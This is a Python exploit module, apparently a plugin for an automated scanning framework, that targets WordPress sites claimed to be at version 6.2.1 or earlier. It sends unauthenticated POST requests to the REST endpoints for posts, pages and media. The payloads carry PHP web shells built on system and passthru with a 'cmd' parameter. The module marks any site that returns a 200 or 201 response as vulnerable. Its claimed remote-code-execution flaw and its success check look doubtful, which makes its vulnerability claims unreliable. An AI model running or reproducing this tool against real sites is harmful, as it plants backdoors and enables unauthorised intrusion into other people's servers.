import requests
from core.printmodels import *
import json

class WP_Property_Injection:
    def __init__(self):
        self.name = "WordPress Property Injection"
        self.description = "WordPress <= 6.2.1 Property Injection to RCE (2023)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json'
            }

            # Multiple attack vectors
            payloads = [
                {
                    "id": "DrDataYE",
                    "author": 1,
                    "status": "future",
                    "title": "DrDataYE Test",
                    "content": "<?php system($_GET['cmd']); ?>",
                    "date": "2025-12-31 23:59:59"
                },
                {
                    "id": 1,
                    "author": 1,
                    "status": "publish",
                    "title": "Security Test",
                    "content": "<?php passthru($_REQUEST['cmd']); ?>"
                }
            ]

            endpoints = [
                f"{site}/wp-json/wp/v2/posts",
                f"{site}/wp-json/wp/v2/pages",
                f"{site}/wp-json/wp/v2/media"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code in [200, 201]:
                        return PrintSuccess(f"[WP-Property-Injection] Vulnerable! Successful injection at {endpoint}")

            return PrintFailed("[WP-Property-Injection] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[WP-Property-Injection] Error: {str(e)}")
